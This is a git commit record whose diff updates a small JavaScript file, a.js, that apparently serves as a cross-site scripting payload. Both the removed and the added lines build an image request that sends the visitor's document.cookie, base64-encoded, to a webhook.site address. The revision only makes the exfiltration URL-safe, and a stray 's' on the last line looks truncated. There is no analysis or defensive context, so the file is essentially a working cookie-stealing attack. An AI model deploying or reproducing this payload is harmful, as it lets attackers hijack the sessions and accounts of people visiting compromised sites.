6d002e36d74e6a73cd3cb061704929e19b45bcb0
im4x <im4xiq@gmail.com>
2025-03-05 05:27:34 -0500

    Update a.js

--- a.js
+++ a.js
@@ -1,2 +1,3 @@
-x = new Image(); x.src = 'https://webhook.site/d821eaac-1c7f-4dd5-b1bd-5db195c2cd18?
-data='+btoa(document.cookie);
+x = new Image();
+x.src = 'https://webhook.site/d821eaac-1c7f-4dd5-b1bd-5db195c2cd18?data=' + encodeURIComponent(btoa(document.cookie));
+s
